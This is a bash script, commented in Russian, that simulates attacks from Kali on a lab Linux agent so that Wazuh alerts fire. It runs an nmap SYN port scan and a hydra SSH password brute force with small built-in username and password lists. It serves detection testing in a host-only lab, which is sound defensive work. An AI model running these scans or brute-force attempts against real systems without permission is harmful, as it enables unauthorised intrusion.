#!/usr/bin/env bash
# Атаки с Kali на Linux-агент ЛАБОРАТОРИИ (host-only сеть). Только на свои ВМ!
# Использование: ./kali-sim.sh 192.168.56.30
set -euo pipefail
TARGET="${1:?укажите IP Linux-агента}"

echo "[T1046] Вертикальный SYN-скан -> UFW log -> soclab portscan -> правило 100106"
sudo nmap -sS -T4 -p 1-1000 "$TARGET"

echo "[T1110.001] Перебор паролей SSH -> правило 100100"
printf 'root\nadmin\ntest\n' > /tmp/users.txt
printf '123456\npassword\nqwerty\nadmin\nletmein\n' > /tmp/pass.txt
hydra -L /tmp/users.txt -P /tmp/pass.txt -t 4 "ssh://$TARGET" || true

echo "Готово. Проверьте алерты 100100 и 100106 в Wazuh Dashboard"
